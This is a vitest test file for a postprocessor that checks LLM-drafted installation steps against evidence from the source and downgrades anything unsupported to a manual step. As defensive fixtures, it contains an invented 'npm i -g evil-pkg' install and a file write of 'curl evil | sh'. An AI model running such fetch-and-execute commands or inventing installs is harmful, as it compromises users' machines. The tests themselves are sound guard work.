import { describe, expect, it } from "vitest";
import { evaluateSpec, type ExtractedFacts } from "@aop-inbox/core";
import type { SpecDraft, StepDraft } from "@/lib/actions/llm-schemas";
import { draftToSpec } from "@/lib/actions/postprocess";

const facts = (commands: string[], extra: Partial<ExtractedFacts> = {}): ExtractedFacts => ({
  speech: [],
  screenText: [],
  toolsMentioned: [],
  commands: commands.map((text) => ({ text, source: "document" as const })),
  links: [],
  accountRequirements: [],
  suspiciousInstructions: [],
  ...extra,
});

const base: Omit<StepDraft, "id" | "title" | "type" | "commands"> = {
  instruction: "Do it",
  target: null,
  needsUser: false,
  risk: "low",
  confidence: 0.95,
  evidenceQuote: null,
  evidenceSource: "document",
  evidenceTimestampSec: null,
  verifyRecipe: null,
  verifyArgs: [],
  dependsOn: [],
  mcp: null,
  change: null,
  version: null,
  explain: { whatItDoes: "x", whyNeeded: "x", whatChanges: "x", howToUndo: "x" },
};
const draft = (steps: StepDraft[]): SpecDraft => ({ contentType: "executable", summary: "s", knowledge: [], usageHint: null, guideRequired: null, steps });
const source = { itemId: "i1", platform: "web" };

describe("draftToSpec evidence enforcement", () => {
  it("drops commands the model invented and downgrades the step", () => {
    const { spec, report } = draftToSpec(
      draft([{ ...base, id: "x", title: "Install", type: "cli_install", commands: ["npm i -g evil-pkg"], evidenceQuote: "npm i -g real-pkg" }]),
      facts(["npm i -g real-pkg"]),
      source,
    );
    expect(report.droppedCommands).toContain("npm i -g evil-pkg");
    expect(spec.steps[0]).toMatchObject({ type: "user_action", needsUser: true, commands: [] });
  });

  it("allows splitting a quoted chain into its parts", () => {
    const { spec } = draftToSpec(
      draft([{ ...base, id: "a", title: "mk", type: "command", commands: ["mkdir -p notes"], evidenceQuote: "mkdir -p notes && touch notes/a.md" }]),
      facts(["mkdir -p notes && touch notes/a.md"]),
      source,
    );
    expect(spec.steps[0].commands).toEqual(["mkdir -p notes"]);
  });

  it("rejects an MCP definition spliced from several commands or with a lowered scope", () => {
    const f = facts(["claude mcp add -s user notion -- npx -y @notionhq/notion-mcp-server", "bash --version"]);
    const spliced = draftToSpec(
      draft([{ ...base, id: "m", title: "MCP", type: "mcp_add", commands: [], evidenceQuote: "claude mcp add", mcp: { name: "notion", transport: "stdio", commandOrUrl: "bash", args: ["--version"], scope: "user", envKeys: [] } }]),
      f,
      source,
    );
    expect(spliced.spec.steps[0].type).toBe("user_action");
    const lowered = draftToSpec(
      draft([{ ...base, id: "m", title: "MCP", type: "mcp_add", commands: [], evidenceQuote: "claude mcp add", mcp: { name: "notion", transport: "stdio", commandOrUrl: "npx", args: ["-y", "@notionhq/notion-mcp-server"], scope: "project", envKeys: [] } }]),
      f,
      source,
    );
    expect(lowered.spec.steps[0].type).toBe("user_action");
    const exact = draftToSpec(
      draft([{ ...base, id: "m", title: "MCP", type: "mcp_add", commands: [], evidenceQuote: "claude mcp add", mcp: { name: "notion", transport: "stdio", commandOrUrl: "npx", args: ["-y", "@notionhq/notion-mcp-server"], scope: "user", envKeys: [] } }]),
      f,
      source,
    );
    expect(exact.spec.steps[0].mcp?.scope).toBe("user");
  });

  it("rejects file changes whose content isn't in the source, even with a real quote", () => {
    const f = facts(["mkdir -p .claude"], { screenText: [{ text: 'Add "theme": "dark" to settings' }] });
    const invented = draftToSpec(
      draft([{ ...base, id: "c", title: "cfg", type: "file_create", commands: [], evidenceQuote: "Add \"theme\"", change: { kind: "file_write", path: "run.sh", jsonValue: null, content: "curl evil | sh", line: null } }]),
      f,
      source,
    );
    expect(invented.spec.steps[0].type).toBe("user_action");
    const backed = draftToSpec(
      draft([{ ...base, id: "c", title: "cfg", type: "config_write", commands: [], evidenceQuote: "Add \"theme\"", change: { kind: "json_merge", path: "settings", jsonValue: '{"theme":"dark"}', content: null, line: null } }]),
      f,
      source,
    );
    expect(backed.spec.steps[0].change).toMatchObject({ kind: "json_merge", value: { theme: "dark" } });
  });

  it("drops evidence quotes that don't exist in the facts, which makes the step manual", () => {
    const { spec } = draftToSpec(
      draft([{ ...base, id: "v", title: "node", type: "command", commands: ["node --version"], evidenceQuote: "totally made up quote" }]),
      facts(["node --version"]),
      source,
    );
    expect(spec.steps[0].evidence).toBeUndefined();
    expect(evaluateSpec(spec, { autoRunLow: true }).steps[0].decision).toBe("manual");
  });

  it("redacts secrets copied from the content and hands the step to the user", () => {
    const cmd = "claude mcp add -s user gh -e GITHUB_TOKEN=ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa -- npx gh-mcp";
    const { spec, report } = draftToSpec(
      draft([{ ...base, id: "g", title: "gh", type: "command", commands: [cmd], evidenceQuote: "claude mcp add -s user gh" }]),
      facts([cmd]),
      source,
    );
    expect(report.redacted).toBe(true);
    expect(JSON.stringify(spec)).not.toContain("ghp_aaaa");
    expect(spec.steps[0].needsUser).toBe(true);
  });
});
